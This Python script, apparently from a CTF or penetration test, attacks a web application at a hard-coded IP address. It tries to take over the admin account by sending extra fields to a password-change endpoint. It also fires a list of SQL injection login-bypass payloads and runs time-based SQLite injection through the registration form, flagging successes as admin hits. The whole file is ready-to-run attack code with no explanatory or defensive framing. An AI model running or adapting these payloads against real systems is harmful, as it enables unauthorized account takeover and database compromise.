import urllib.request, urllib.parse, http.cookiejar, re, time, sys

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op, cj


def req(op, p, data=None, method=None, hdrs=None, raw_body=None, ct=None):
    h = {}
    if raw_body is not None:
        body = raw_body.encode()
        h["Content-Type"] = ct or "application/x-www-form-urlencoded"
    else:
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        if body is not None:
            h["Content-Type"] = "application/x-www-form-urlencoded"
    h.update(hdrs or {})
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


def mkuser(tag="m"):
    op, cj = sess()
    u = tag + str(int(time.time() * 1000) % 1000000)
    pw = "orig" + u
    req(op, "/register", {"username": u, "password": pw})
    s, b = req(op, "/login", {"username": u, "password": pw})
    ok = "我的账户" in b
    return op, cj, u, pw, ok


# ---- A. change_password 传额外字段 ----
print("=== A. change_password extra fields")
for extra in [{"username": "admin"}, {"user": "admin"}, {"name": "admin"},
              {"id": "1"}, {"uid": "1"}, {"user_id": "1"}, {"target": "admin"},
              {"username": "admin", "old_password": "x"}]:
    op, cj, u, pw, ok = mkuser("a")
    if not ok:
        print("  mkuser fail"); continue
    d = {"new_password": "PWNED123"}
    d.update(extra)
    s, b = req(op, "/change_password", d, "POST")
    # 尝试 admin 登录
    op2, _ = sess()
    s2, b2 = req(op2, "/login", {"username": "admin", "password": "PWNED123"}, "POST")
    hit = "我的账户" in b2 and "（admin）" in b2.replace(" ", "")
    print(f"  {str(extra):45s} chg={s} {clean(b)[:60]:60s} adminlogin={'HIT!!' if hit else 'no'}")

# ---- B. login 注入 ----
print("\n=== B. login injection")
PAYLOADS = [
    ("admin'--", "x"), ("admin' -- ", "x"), ("admin'#", "x"), ("admin'/*", "x"),
    ("admin' or '1'='1'--", "x"), ("admin' or 1=1--", "x"),
    ("admin'/**/or/**/1=1--", "x"), ("admin\"--", "x"), ("admin' or ''='", "x"),
    ("admin", "' or 1=1--"), ("admin", "' or '1'='1"), ("admin", "x' or '1'='1'--"),
    ("admin' or 'a'='a", "x"), ("admin')--", "x"), ("admin') or ('1'='1'--", "x"),
]
for u, p in PAYLOADS:
    op, cj = sess()
    s, b = req(op, "/login", {"username": u, "password": p}, "POST")
    t = clean(b)
    res = "HIT!!" if ("我的账户" in b and "（admin）" in t.replace(" ", "")) else ("myacct" if "我的账户" in b else "fail")
    print(f"  u={u!r:28s} p={p!r:20s} {s} {res} {t[:90]}")

# ---- C. register 注入 / 延时 ----
print("\n=== C. register timing (randomblob)")
import statistics
for u in ["t1", "t1'||(SELECT randomblob(60000000))||'", "t2'||(SELECT randomblob(60000000))||'"]:
    op, cj = sess()
    st = time.time()
    s, b = req(op, "/register", {"username": u + str(int(time.time() * 1000) % 9999), "password": "p"}, "POST")
    el = time.time() - st
    print(f"  {u[:40]:42s} {s} {el:.2f}s {clean(b)[:60]}")
